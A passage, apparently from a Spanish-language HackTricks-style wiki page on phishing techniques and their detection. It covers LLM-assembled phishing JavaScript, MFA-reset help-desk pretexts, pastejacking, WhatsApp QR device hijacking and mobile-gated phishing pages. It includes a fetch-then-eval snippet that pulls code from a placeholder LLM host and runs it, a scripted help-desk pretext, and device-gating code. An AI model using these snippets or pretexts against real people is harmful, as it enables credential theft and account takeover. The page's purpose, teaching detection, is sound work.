2. **Llamada a la API desde el cliente:** al cargarse, JS llama a un LLM público (Gemini/DeepSeek/etc.) o a un proxy CDN; solo el prompt/la llamada a la API aparece en el HTML estático.
3. **Ensamblar y ejecutar:** concatenar la respuesta y ejecutarla (polimórfica en cada visita):

```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
  .then(r=>r.json())
  .then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```

4. **Phish/exfil:** el código generado personaliza el señuelo (p. ej., analiza tokens de LogoKit) y envía las credenciales al endpoint oculto en el prompt.

**Rasgos de evasión**
- El tráfico llega a dominios conocidos de LLM o a proxies de CDN de buena reputación; a veces usa WebSockets para comunicarse con un backend.
- No hay payload estático; el JS malicioso solo existe después del renderizado.
- Las generaciones no deterministas producen stealers **únicos** por sesión.

**Ideas de detección**
- Ejecuta sandboxes con JS habilitado; marca la ejecución de `eval` en tiempo de ejecución o la creación dinámica de scripts a partir de respuestas de LLM.
- Busca solicitudes POST del front-end a APIs de LLM seguidas inmediatamente de `eval`/`Function` sobre el texto devuelto.
- Genera alertas por dominios de LLM no autorizados en el tráfico de clientes, seguidos de solicitudes POST con credenciales.

---

## Variante de MFA Fatigue / Push Bombing: reinicio forzado
Además del push bombing clásico, los operadores simplemente **fuerzan un nuevo registro de MFA** durante la llamada al servicio de asistencia, anulando el token existente del usuario. Cualquier solicitud de inicio de sesión posterior le parecerá legítima a la víctima.

```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```

Monitoriza los eventos de AzureAD/AWS/Okta en los que **`deleteMFA` + `addMFA`** ocurran **con pocos minutos de diferencia desde la misma IP**.



## Clipboard Hijacking / Pastejacking

Los atacantes pueden copiar silenciosamente comandos maliciosos en el portapapeles de la víctima desde una página web comprometida o con typosquatting y luego engañar al usuario para que los pegue en **Win + R**, **Win + X** o una ventana de terminal, ejecutando código arbitrario sin ninguna descarga ni archivo adjunto.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Phishing móvil y distribución de aplicaciones maliciosas (Android e iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### Secuestro de dispositivos vinculados de WhatsApp mediante ingeniería social con códigos QR
* Una página señuelo (p. ej., un «canal» falso de un ministerio/CERT) muestra un código QR de WhatsApp Web/Desktop e indica a la víctima que lo escanee, agregando silenciosamente al atacante como **dispositivo vinculado**.<sup>[[12]](#references)</sup>
* El atacante obtiene de inmediato visibilidad de los chats y contactos hasta que se elimine la sesión. Las víctimas pueden ver más adelante una notificación de «nuevo dispositivo vinculado»; los defensores pueden buscar eventos inesperados de vinculación de dispositivos poco después de visitas a páginas con códigos QR no confiables.

### Phishing condicionado a dispositivos móviles para evadir crawlers/sandboxes
Los operadores recurren cada vez más a condicionar sus flujos de phishing a una comprobación sencilla del dispositivo, para que los crawlers de escritorio nunca lleguen a las páginas finales. Un patrón común es un pequeño script que comprueba si el DOM admite eventos táctiles y envía el resultado a un endpoint del servidor; los clientes que no son móviles reciben un HTTP 500 (o una página en blanco), mientras que a los usuarios móviles se les muestra el flujo completo.<sup>[[7]](#references)</sup>

Fragmento mínimo del cliente (lógica típica):

```html
<script src="/static/detect_device.js"></script>
```

`detect_device.js` lógica (simplificada):

```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
  .then(()=>location.reload());
```

Comportamiento del servidor observado con frecuencia:
- Establece una cookie de sesión durante la primera carga.
- Acepta `POST /detect {"is_mobile":true|false}`.
- Devuelve 500 (o un marcador de posición) a las solicitudes GET posteriores cuando `is_mobile=false`; solo sirve la página de phishing si es `true`.

Heurísticas de búsqueda y detección:
- Consulta de urlscan: `filename:"detect_device.js" AND page.status:500`
- Telemetría web: secuencia `GET /static/detect_device.js` → `POST /detect` → HTTP 500 cuando el dispositivo no es móvil; las rutas legítimas para víctimas móviles devuelven 200 y, a continuación, HTML/JS.
- Bloquear o examinar las páginas que condicionen el contenido exclusivamente a `ontouchstart` u otras comprobaciones similares del dispositivo.

Consejos de defensa:
- Ejecutar crawlers con fingerprints similares a los de dispositivos móviles y con JS habilitado para revelar el contenido restringido.
- Generar alertas ante respuestas 500 sospechosas después de `POST /detect` en dominios recién registrados.

## References

- [1] [Generación de variaciones de dominios usadas en phishing (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
- [2] [Detección de phishing: herramientas y técnicas (0xPatrik)](https://0xpatrik.com/phishing-domains/)
- [3] [Robar credenciales y evadir 2FA usando noVNC (mr.d0x)](https://mrd0x.com/bypass-2fa-using-novnc/)
- [4] [Robando sesiones y bypasseando 2FA con EvilnoVNC (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [5] [Cómo instalar y configurar DKIM con Postfix en Debian Wheezy (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [6] [Informe global de respuesta a incidentes de Unit 42 de 2025: edición de ingeniería social](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [7] [Silent Smishing: infraestructura de phishing restringida a dispositivos móviles y heurísticas (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [8] [La nueva frontera de los ataques de ensamblaje en tiempo de ejecución: uso de LLM para generar JavaScript de phishing en tiempo real](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [9] [Suplantación de identidad, secuestro de clics y TDS: dentro de un ecosistema de distribución de malware](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
- [10] [Bitsquatting de Windows.com (Remy Hax)](https://remyhax.xyz/posts/bitsquatting-windows/)
- [11] [Secuestro del tráfico a windows.com de Microsoft mediante bit flipping (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
- [12] [¿Amor? En realidad: una aplicación de citas falsa usada como señuelo en una campaña de spyware dirigido en Pakistán](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [13] [IoC y muestras de ESET GhostChat](https://github.com/eset/malware-ioc/tree/master/ghostchat)
- [14] [Exposición de AdFection: cómo Discover-Tech convirtió los anuncios dirigidos en un canal para spyware mercenario sin clics](https://citizenlab.ca/research/how-discover-tech-turned-targeted-ads-into-a-pipeline-for-spyware/)
{{#include ../../banners/hacktricks-training.md}}
